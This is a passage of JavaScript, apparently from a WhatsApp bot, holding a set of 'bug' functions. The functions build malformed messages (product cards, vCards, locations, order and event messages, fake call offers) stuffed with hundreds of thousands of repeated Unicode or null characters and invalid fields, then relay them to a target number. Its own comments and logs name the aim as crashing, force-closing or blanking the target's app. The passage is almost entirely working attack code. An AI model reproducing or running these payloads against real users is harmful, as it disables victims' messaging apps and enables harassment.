							entryPointConversionApp: "entry_point_app_example",
							entryPointConversionDelaySeconds: 5,
							disappearingMode: {},
							actionLink: {
								url: "https://t.me/Popyeyeye"
							},
							groupSubject: "Example Group Subject",
							parentGrouptarget: "6287888888888-1234567890@g.us",
							trustBannerType: "trust_banner_example",
							trustBannerAction: 1,
							isSampled: false,
							utm: {
								utmSource: "utm_source_example",
								utmCampaign: "utm_campaign_example"
							},
							forwardedNewsletterMessageInfo: {
								newslettertarget: "6287888888888-1234567890@g.us",
								serverMessageId: 1,
								newsletterName: " X ",
								contentType: "UPDATE",
								accessibilityText: " X "
							},
							businessMessageForwardInfo: {
								businessOwnertarget: "0@s.whatsapp.net"
							},
							smbClientCampaignId: "smb_client_campaign_id_example",
							smbServerCampaignId: "smb_server_campaign_id_example",
							dataSharingContext: {
								showMmDisclosure: true
							}
						}
					}
        };
  
  const msg1 = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: { locationMessage },
    },
  }, {});
  const msg2 = generateWAMessageFromContent(target, extendedTextMessage, {});
  
 for (const msg of [msg1, msg2]) {
  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statustargetList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { target: target },
          content: undefined,
         }],
       }],
     }],
   });
  }
}

async function HyperSixty(target, mention) {
  try {
    const Node = "𑇂𑆵𑆴𑆿";
    const metaNode = [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }];

    const locationMessage = {
      degreesLatitude: -9.09999262999,
      degreesLongitude: 199.99963118999,
      jpegThumbnail: null,
      name: "\u0000" + Node.repeat(15000),
      address: "\u0000" + Node.repeat(10000),
      url: `${Node.repeat(25000)}.com`
    };

    const extendMsg = {
      extendedTextMessage: {
        text: "🧪⃟꙰。⌁ ͡ ⃰͜.ꪸꪰtׁׅꭈׁׅꫀׁׅܻ᥎꫶ׁׅᨵׁׅ꯱ׁׅ֒ꪱׁׅυׁׅ ꩇ",
        matchedText: "",
        description: Node.repeat(25000),
        title: Node.repeat(15000),
        previewType: "NONE",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/OLEoNAWOTCTFRfHQNAMYmMjIUEgAcmFqKiw0xFH//Z",
        thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc",
        thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
        thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
        mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
        mediaKeyTimestamp: "1743101489",
        thumbnailHeight: 641,
        thumbnailWidth: 640,
        inviteLinkGroupTypeV2: "DEFAULT"
      }
    };

    const makeMsg = content =>
      generateWAMessageFromContent(
        target,
        { viewOnceMessage: { message: content } },
        {}
      );

    const msg1 = makeMsg({ locationMessage });
    const msg2 = makeMsg(extendMsg);
    const msg3 = makeMsg({ locationMessage });

    for (const m of [msg1, msg2, msg3]) {
      await sock.relayMessage("status@broadcast", m.message, {
        messageId: m.key.id,
        statusJidList: [target],
        additionalNodes: metaNode
      });
    }

  } catch (e) {
    console.error(e);
  }
}

//=====( Blank Ios )=====\\

async function iosProduct2(target) {
 await sock.sendMessage(
    target,
    {
          productMessage: {
            title: "👁‍🗨⃟꙰。⃝𝐓𝐫𝐞𝐯𝐨𝐬𝐢𝐮𝐦 ⌁ 𝐀𝐭𝐭𝐚𝐜𝐤.ꪸ⃟‼️  Ꮂ ⋆>",
            description: "👁‍🗨⃟꙰。⃝𝐓𝐫𝐞𝐯𝐨𝐬𝐢𝐮𝐦 ⌁ 𝐀𝐭𝐭𝐚𝐜𝐤.ꪸ⃟‼️  Ꮂ ⋆>" + "𑇂𑆵𑆴𑆿".repeat(60000),
            thumbnail: null,
            productId: "X99",
            retailerId: "X1Y1Z1",
            url: "https://t.me/Xavienzz",
            body: "🩸" + "𑇂𑆵𑆴𑆿".repeat(1000),
            footer: "🩸",
            contextInfo: {
              remoteJid: "13135559098@s.whatsapp.net",
              mentionedJid: "status@broadcast",
              participant: "13135559098@s.whatsapp.net",
              forwardingScore: 9999,
              isForwarded: true,
              businessMessageForwardInfo: {
                businessOwnerJid: "13135559098@s.whatsapp.net"
              },
              externalAdReply: {
                automatedGreetingMessageShown: true,
                automatedGreetingMessageCtaType: "\u0000".repeat(100000),
                greetingMessageBody: "\u0000",
              }
            },
            priceAmount1000: 50000,
            currencyCode: "USD"
          }
    },
    { quoted: quotedios, userJid: target }
  )
}

async function IosCtt(target) {
  await sock.relayMessage(target, {
  "contactMessage": {
    "displayName": "👁‍🗨⃟꙰。⃝𝐓𝐫𝐞𝐯𝐨𝐬𝐢𝐮𝐦 ⌁ 𝐀𝐭𝐭𝐚𝐜𝐤.ꪸ⃟‼️  Ꮂ ⋆>" + "𑇂𑆵𑆴𑆿".repeat(10000),
    "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;👁‍🗨⃟꙰。⃝𝐓𝐫𝐞𝐯𝐨𝐬𝐢𝐮𝐦 ⌁ 𝐀𝐭𝐭𝐚𝐜𝐤.ꪸ⃟‼️  Ꮂ ⋆>${"𑇂𑆵𑆴𑆿".repeat(10000)};;;\nFN:👁‍🗨⃟꙰。⃝𝐓𝐫𝐞𝐯𝐨𝐬𝐢𝐮𝐦 ⌁ 𝐀𝐭𝐭𝐚𝐜𝐤.ꪸ⃟‼️  Ꮂ ⋆>${"𑇂𑆵𑆴𑆿".repeat(10000)}\nNICKNAME:👁‍🗨⃟꙰。⃝𝐓𝐫𝐞𝐯𝐨𝐬𝐢𝐮𝐦 ⌁ 𝐀𝐭𝐭𝐚𝐜𝐤.ꪸ⃟‼️  Ꮂ ⋆>${"ᩫᩫ".repeat(4000)}\nORG:👁‍🗨⃟꙰。⃝𝐓𝐫𝐞𝐯𝐨𝐬𝐢𝐮𝐦 ⌁ 𝐀𝐭𝐭𝐚𝐜𝐤.ꪸ⃟‼️  Ꮂ ⋆>${"ᩫᩫ".repeat(4000)}\nTITLE:👁‍🗨⃟꙰。⃝𝐓𝐫𝐞𝐯𝐨𝐬𝐢𝐮𝐦 ⌁ 𝐀𝐭𝐭𝐚𝐜𝐤.ꪸ⃟‼️  Ꮂ ⋆>${"ᩫᩫ".repeat(4000)}\nitem1.TEL;waid=6287873499996:+62 878-7349-9996\nitem1.X-ABLabel:Telepon\nitem2.EMAIL;type=INTERNET:👁‍🗨⃟꙰。⃝𝐓𝐫𝐞𝐯𝐨𝐬𝐢𝐮𝐦 ⌁ 𝐀𝐭𝐭𝐚𝐜𝐤.ꪸ⃟‼️  Ꮂ ⋆>${"ᩫᩫ".repeat(4000)}\nitem2.X-ABLabel:Kantor\nitem3.EMAIL;type=INTERNET:👁‍🗨⃟꙰。⃝𝐓𝐫𝐞𝐯𝐨𝐬𝐢𝐮𝐦 ⌁ 𝐀𝐭𝐭𝐚𝐜𝐤.ꪸ⃟‼️  Ꮂ ⋆>${"ᩫᩫ".repeat(4000)}\nitem3.X-ABLabel:Kantor\nitem4.EMAIL;type=INTERNET:👁‍🗨⃟꙰。⃝𝐓𝐫𝐞𝐯𝐨𝐬𝐢𝐮𝐦 ⌁ 𝐀𝐭𝐭𝐚𝐜𝐤.ꪸ⃟‼️  Ꮂ ⋆>${"ᩫᩫ".repeat(4000)}\nitem4.X-ABLabel:Pribadi\nitem5.ADR:;;👁‍🗨⃟꙰。⃝𝐓𝐫𝐞𝐯𝐨𝐬𝐢𝐮𝐦 ⌁ 𝐀𝐭𝐭𝐚𝐜𝐤.ꪸ⃟‼️  Ꮂ ⋆>${"ᩫᩫ".repeat(4000)};;;;\nitem5.X-ABADR:ac\nitem5.X-ABLabel:Rumah\nX-YAHOO;type=KANTOR:👁‍🗨⃟꙰。⃝𝐓𝐫𝐞𝐯𝐨𝐬𝐢𝐮𝐦 ⌁ 𝐀𝐭𝐭𝐚𝐜𝐤.ꪸ⃟‼️  Ꮂ ⋆>${"ᩫᩫ".repeat(4000)}\nPHOTO;BASE64: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\nX-WA-BIZ-NAME:👁‍🗨⃟꙰。⃝𝐓𝐫𝐞𝐯𝐨𝐬𝐢𝐮𝐦 ⌁ 𝐀𝐭𝐭𝐚𝐜𝐤.ꪸ⃟‼️  Ꮂ ⋆>${"ᩫᩫ".repeat(4000)}\nEND:VCARD`,
  "contextInfo": {
     "participant": target,
        "externalAdReply": {
           "automatedGreetingMessageShown": true,
           "automatedGreetingMessageCtaType": "\u0000".repeat(100000),
           "greetingMessageBody": "\u0000"
        }
      }
    }
  }, {})
}

//=====( Forclose )=====\\

async function LocationClick(sock, target) {
  try {
      await sock.sendMessage(target, {
        location: {
          degreesLatitude: 254515607254515602025.843324832,
          degreesLongitude: 254515607254515602025.843324832,
          name: "👻⃟Ṫṛëṿöṡïüṁ ṚÖṚ༄",
          address: "Asalamualaikum paket dari Lolipop",
          jpegThumbnail: Buffer.from(
            "iVBORw0KGgoAAAANSUhEUgAAAJYAAACWCAMAAADyQn0PAAAAG1BMVEUAAAD///8AAAB/f39ISEhpaWmqqqq4uLjo6OjT09P4+Pjv7++3t7e9vb3AwMBvb2+np6fHx8eYmJiioqLw8PDn5+eTk5NwcHB9fX2tra3Pz8+cnJxVVVVGRkY2NjZ0dHRkZGQeHh6EhIRoaGh/f3+srKyqqqqioqLZ2dnCwsKmpqbLy8vR0dGUlJSHh4d5eXlISEhXV1dCQkJra2s/Pz+YmJiSkpKJiYmBgYFLS0vDw8Ojo6OcnJzExMS/v79oaGhERERvb28ZGRkYGBhSUlK0tLRbW1tHR0d/f39ZWVlLS0tJSUlCQkJPT09+fn5paWlAQEBwcHCenp6mpqaAgIB0dHScnJwAAAB5tqW0AAABOElEQVR4nO3bS27DMAxFUQ9E2///M0d7G1lRpg5iX9G4lK0q1z0wAAAAAAAAAAAAAAAADw3+o6q5rZ9Tnqjv6x+MZ7w4m2y7H1u4b0n5m7Z8pM3Z+6f6x4k2aPp4dH8m2b6Pp4eH8nWb6Pp4dH8m2b6Pp4eH8nWb6Pp4dH8m2b6Pp4eH8nWb6Pp4dH8AAAAAAAAAAAAAAAAAAAAAAAD4Bv4B8a6p1X3j8gAAAABJRU5ErkJggg==",
            "base64"
          )
        },
        caption: "👻⃟Ṫṛëṿöṡïüṁ ṚÖṚ༄"
      })

      await sock.sendMessage(target, {
        channelInviteMessage: {
          channelJid: "120363407643835026@newsletter",
          channelName: "👻⃟Ṫṛëṿöṡïüṁ ṚÖṚ༄",
          caption: "ꦾ".repeat(100000)
        }
      })

      await sock.sendMessage(target, {
        orderMessage: {
          orderId: "ORDER-001",
          itemCount: 1,
          status: 1,
          surface: 1,
          message: "ꦽ".repeat(100000),
          orderTitle: "Trevosium_Ghost",
          sellerJid: sock.user.id,
          token: " ",
          totalAmount1000: 999999,
          totalCurrencyCode: "IDR"
        }
      })

      console.log(`Succes Sending Bug Forclose Click To ${target}`)

  } catch (err) {
    console.log("Failed Sending Bug => Error:", err)
  }
}

//=====( Delay Blank Visible )=====\\

async function DelayBlank(sock, target) {
    const msg = {
        viewOnceMessage: {
            message: {
                locationMessage: {
                    body: {
                        text: "┃► 𝚃𝚛𝚎𝚟𝚘𝚜𝚒𝚞𝚖 (🦠)",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1_000_000),
                        version: 3
                    }
                }
            }
        }
    };
    
    const msg2 = {
        locationMessage: {
            degreesLongitude: 0,
            degreesLatitude: 0,
            name: "┃► 𝚃𝚛𝚎𝚟𝚘𝚜𝚒𝚞𝚖 (🦠)" + "ꦾ".repeat(60000) + "ꦽ".repeat(60000),
            url: "https://stickerPack/" + "ꦾ".repeat(9000),
            address: "┃► 𝚃𝚛𝚎𝚟𝚘𝚜𝚒𝚞𝚖 (🦠)" + "ꦾ".repeat(60000) + "ꦽ".repeat(60000),
            contextInfo: {
                externalAdReply: {
                    renderLargerThumbnail: true,
                    showAdAttribution: true,
                    body: "┃► 𝚃𝚛𝚎𝚟𝚘𝚜𝚒𝚞𝚖 (🦠)" + "ꦾ".repeat(50000) + "ꦽ".repeat(50000),
                    title: "\u0000".repeat(10000),
                    sourceUrl: "https://stickerPack/" + "ꦾ".repeat(10000),
                    thumbnailUrl: null,
                    quotedAd: {
                        advertiserName: "ི꒦ྀ".repeat(10000),
                        mediaType: 2,
                        jpegThumbnail: "/9j/8HACE82HSGSI",
                        caption: "┃► 𝚃𝚛𝚎𝚟𝚘𝚜𝚒𝚞𝚖 (🦠)" + "ꦾ".repeat(50000) + "ꦽ".repeat(50000)
                    },
                    pleaceKeyHolder: {
                        remoteJid: "0@s.whatsapp.net",
                        fromMe: false,
                        id: "ABCD1234567"
                    }
                },
                quotedMessage: {
                    viewOnceMessage: {
                        message: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/13158749_1750335815519895_6021414070433962213_n.enc",
                                mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                                fileName: "Xavienzz.doc" + "ꦾ".repeat(50000) + "ꦽ".repeat(50000),
                                fileLength: "99999999999",
                                pageCount: -99999,
                                mediaKey: Buffer.from("4b2d315efbdfea6d69ffdd6ce80ae57fa90ddcd8935b897d85ba29ef15674371", "hex"),
                                fileSha256: Buffer.from("4c69bbca7b6396dd6766327cc0b13fc64b97c581442eea626c3919643f3793c4", "hex"),
                                fileEncSha256: Buffer.from("414942a0d3204ae71b4585ae1dedafcc8ad2a14687fa9cbbcde3efb5a4ac86a9", "hex"),
                                mediaKeyTimestamp: 1748420423,
                                directPath: "/v/t62.7119-24/13158749_1750335815519895_6021414070433962213_n.enc"
                            }
                        }
                    }
                }
            }
        }
    };
    
    await sock.relayMessage(target, msg, {
        participant: target
    });
    
    await sock.relayMessage(target, msg2, {
        participant: target
    });
    
    console.log(`Succes Sending Bug DelayBlank To ${target}`);
}

async function blnkmark(target) {
  try {
    const Abimsukasalsa = "\u0000".repeat(20000);

    const msg1 = {
      viewOnceMessage: {
        message: {
          fakeViewOnceMessage: {
            newsletterName: "┃► 𝚃𝚛𝚎𝚟𝚘𝚜𝚒𝚞𝚖 (🦠)" + "ꦽ".repeat(2500),
            interactiveResponseMessage: {
              jpegThumbnail: null,
              videoMessage: {
                url: "https://example.com/videomp4",
                buttons: "...",
                body: {
                  text: "┃► 𝚃𝚛𝚎𝚟𝚘𝚜𝚒𝚞𝚖 (🦠)" + "ꦽ".repeat(9000)
                },
                buttonsArray: [
                  {
                    name: "call_permission_request",
                    paramsJson: "\u0000".repeat(90000)
                  },
                  {
                    name: "cta_url",
                    buttonParamsJson: Abimsukasalsa,
                    url: "https://wa.me/stickerPack/Xavienzz"
                  },
                  {
                    name: "address_message",
                    buttonParamsJson: "\u0003".repeat(9500)
                  },
                  {
                    name: "cta_call",
                    buttonParamsJson: "\u0000".repeat(9900)
                  }
                ],
                nativeFlowResponseMessage: {
                  name: "call_permission_request"
                }
              },
              systemMessageV2: {
                text: "┃► 𝚃𝚛𝚎𝚟𝚘𝚜𝚒𝚞𝚖 (🦠)" + "ꦽ".repeat(50000)
              },
              interactiveMessage: {
                body: { text: null }
              }
            }
          }
        }
      },
      messageOptions: "custom",
      contextInfo: {
        adReply: {}
      }
    };

    const msg2 = {
      body: { text: "┃► 𝚃𝚛𝚎𝚟𝚘𝚜𝚒𝚞𝚖 (🦠)" },
      nativeFlowMessage: {
        nativeFlowResponseMessage: {
          inviteExpiration: Date.now() + 9999999999,
          buttons: [
            {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(90000)
            }
          ],
          address: "┃► 𝚃𝚛𝚎𝚟𝚘𝚜𝚒𝚞𝚖 (🦠)" + "ꦾ".repeat(15000) + "ꦽ".repeat(15000)
        }
      },
      contextInfo: {
        payload: "ꦽ".repeat(3500),
        contextInfo: {
          interactiveMessage: { body: { format: true } }
        },
        participant: "targetjid@s.whatsapp.net",
        mentionedJid: ["0@s.whatsapp.net"]
      },
      fromMe: false,
      caption: null,
      participant: "5521992999999@s.whatsapp.net",
      remoteJid: "0s.whatsapp.net"
    };

    for (const msg of [msg1]) {
      await sock.relayMessage(target, msg, {
        participant: { jid: target },
        messageId: null
      });
    }

    for (const msg of [msg2]) {
      await sock.relayMessage(target, msg, {
        participant: { jid: target },
        messageId: null
      });
    }

    console.log(`Succes Sending Bug DelayBlank To ${target}`);

  } catch (e) {
    console.error(e);
  }
}

async function gsIntjav(sock, target, otaxkiw = true) {
  for (let i = 0; i < 20; i++) {

    let otaxi = {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length: 2000 }, (_, i) => `628${z + 72}@s.whatsapp.net`),
          isForwarded: true,
          forwardingScore: 7205,
          forwardedNewsletterMessageInfo: {
            newsletterJid: "12037205250208@newsletter",
            newsletterName: "┃► 𝚃𝚛𝚎𝚟𝚘𝚜𝚒𝚞𝚖 (🦠)",
            serverMessageId: 1000,
            accessibilityText: "┃► 𝚃𝚛𝚎𝚟𝚘𝚜𝚒𝚞𝚖 (🦠)"
          },
          statusAttributionType: "RESHARED_FROM_MENTION",
          contactVcard: true,
          isSampled: true,
          dissapearingMode: {
            initiator: target,
            initiatedByMe: true
          },
          expiration: Date.now()
        },
        body: {
          text: "┃► 𝚃𝚛𝚎𝚟𝚘𝚜𝚒𝚞𝚖 (🦠)",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: `{"values":{"in_pin_code":"7205","building_name":"russian motel","address":"2.7205","tower_number":"507","city":"Batavia","name":"Otax?","phone_number":"+13135550202","house_number":"7205826","floor_number":"16","state":"${"\x10".repeat(1000000)}"}}`,
          version: 3
        }
      }
    }

    let msg = generateWAMessageFromContent(
      target,
      { groupStatusMessageV2: { message: otaxi } },
      {}
    )

    await sock.relayMessage(
      target,
      msg.message,
      otaxkiw
        ? { messageId: msg.key.id, participant: { jid: target }, userJid: target }
        : { messageId: msg.key.id }
    )

    await sleep(1000)

    await sock.sendMessage(target, {
      delete: {
        remoteJid: target,
        fromMe: true,
        id: msg.key.id,
        participant: target
      }
    })
  }
}

async function eventFlowres(target) {
    await sock.relayMessage(
        target,
        {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        messageSecret: crypto.randomBytes(32)
                    },
                    eventMessage: {
                        isCanceled: false,
                        name: "┃► 𝚃𝚛𝚎𝚟𝚘𝚜𝚒𝚞𝚖 (🦠)̤",
                        description: "┃► 𝚃𝚛𝚎𝚟𝚘𝚜𝚒𝚞𝚖 (🦠)",
                        location: {
                            degreesLatitude: "a",
                            degreesLongitude: "a",
                            name: "┃► 𝚃𝚛𝚎𝚟𝚘𝚜𝚒𝚞𝚖 (🦠)"
                        },
                        joinLink: "https://call.whatsapp.com/voice/wrZ273EsqE7NGlJ8UT0rtZ",
                        startTime: "1714957200",
                        thumbnailDirectPath: "https://files.catbox.moe/6hu21j.jpg",
                        thumbnailSha256: Buffer.from('1234567890abcdef', 'hex'),
                        thumbnailEncSha256: Buffer.from('abcdef1234567890', 'hex'),
                        mediaKey: Buffer.from('abcdef1234567890abcdef1234567890', 'hex'),
                        mediaKeyTimestamp: Date.now(),
                        contextInfo: {
                            mentions: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 5000000) + "@.s.whatsapp.net"),
                            remoteJid: "status@broadcast",
                            participant: "0@s.whatsapp.net",
                            fromMe: false,
                            isForwarded: true,
                            forwardingScore: 9999,
                            forwardedNewsletterMessageInfo: {
                              newsletterJid: "120363422445860082@newsletter",
                              serverMessageId: 1,
                              newsletterName: "┃► 𝚃𝚛𝚎𝚟𝚘𝚜𝚒𝚞𝚖 (🦠)"
                            },
                            quotedMessage: {
                                interactiveResponseMessage: {
                                    body: {
                                        text: "┃► 𝚃𝚛𝚎𝚟𝚘𝚜𝚒𝚞𝚖 (🦠)",
                                        format: "DEFAULT"
                                    },
                                    nativeFlowResponseMessage: {
                                        name: 'address_message',
                                        paramsJson: "\x10".repeat(1000000),
                                        version: 3
                                    }
                                }
                            }
                        }
                    }
                }
            }
        },
        {
            ephemeralExpiration: 5,
            timeStamp: Date.now()
        }
    );
}

async function crashGP(sock, target) {
await sock.relayMessage(target, {
  "interactiveMessage": {
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "review_and_pay",
          "buttonParamsJson": `{\"currency\":\"IDR\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":800,\"offset\":100},\"reference_id\":\"4TU82OG2957\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"description\":\"\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-2c7378a6-1643-4dba-8b2d-23e556a81ad4\",\"name\":\"Otax\",\"amount\":{\"value\":800,\"offset\":100},\"quantity\":1}]},\"additional_note\":\"xtx\",\"native_payment_methods\":[],\"share_payment_status\":false}`
          }
        ]
      }
    }
  }, {});
}

async function croserds(sock, target) {
const { jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require("xatabail");

  if (!global.__flyingLimit) global.__flyingLimit = {};
  if (!global.__flyingMutex) global.__flyingMutex = Promise.resolve();
  const delay = (ms) => new Promise((r) => setTimeout(r, ms));

  global.__flyingMutex = global.__flyingMutex.then(async () => {
    let last = global.__flyingLimit[target] || 0;
    let now = Date.now();
    let wait = last + (1000 + Math.random() * 500) - now;
    if (wait > 0) await delay(wait);
    global.__flyingLimit[target] = Date.now();
  });
  await global.__flyingMutex;
  const devices = (
    await sock.getUSyncDevices([target], false, false)
  ).map(({ user, device }) => `${user}:${device || ""}@s.whatsapp.net`);
  await sock.assertSessions(devices);
  const xnxx = () => {
    const map = {};
    return {
      mutex(key, fn) {
        if (!map[key]) {
          map[key] = { task: Promise.resolve() };
        }
        map[key].task = (async (prev) => {
          try {
            await prev;
          } catch {}

          return fn();
        })(map[key].task);

        return map[key].task;
      },
    };
  };
  const memek = xnxx();
  const bokep = (buf) =>
    Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
  const yntkts = sock.encodeWAMessage?.bind(sock);
  sock.createParticipantNodes = async (
    recipientJids,
    message,
    extraAttrs = {}
  ) => {
    if (!recipientJids.length) {
      return { nodes: [], shouldIncludeDeviceIdentity: false };
    }
    const patched =
      (await sock.patchMessageBeforeSending?.(message, recipientJids)) ||
      message;
    const arrayMsg = Array.isArray(patched)
      ? patched
      : recipientJids.map((jid) => ({
          recipientJid: jid,
          message: patched,
        }));
    let shouldIncludeDeviceIdentity = false;
    const nodes = await Promise.all(
      arrayMsg.map(async ({ recipientJid: jid, message: msg }) => {
        const bytes = bokep(
          yntkts ? yntkts(msg) : encodeWAMessage(msg)
        );
        return memek.mutex(jid, async () => {
          const { type, ciphertext } =
            await sock.signalRepository.encryptMessage({
              jid,
              data: bytes,
            });
          if (type === "pkmsg") {
            shouldIncludeDeviceIdentity = true;
          }
          return {
            tag: "to",
            attrs: { jid },
            content: [
              {
                tag: "enc",
                attrs: {
                  v: "2",
                  type,
                  ...extraAttrs,
                },
                content: ciphertext,
              },
            ],
          };
        });
      })
    );
    return {
      nodes: nodes.filter(Boolean),
      shouldIncludeDeviceIdentity,
    };
  };
  const { nodes: destinations, shouldIncludeDeviceIdentity } =
    await sock.createParticipantNodes(
      devices,
      { conversation: "y" },
      { count: "0" }
    );
  const callId = crypto
    .randomBytes(16)
    .toString("hex")
    .slice(0, 64)
    .toUpperCase();
  const callNode = {
    tag: "call",
    attrs: {
      to: target,
      id: sock.generateMessageTag(),
      from: sock.user.id,
    },
    content: [
      {
        tag: "offer",
        attrs: {
          "call-id": callId,
          "call-creator": sock.user.id,
        },
        content: [
          { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
          { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
          { tag: "net", attrs: { medium: "3" } },
          {
            tag: "capability",
            attrs: { ver: "1" },
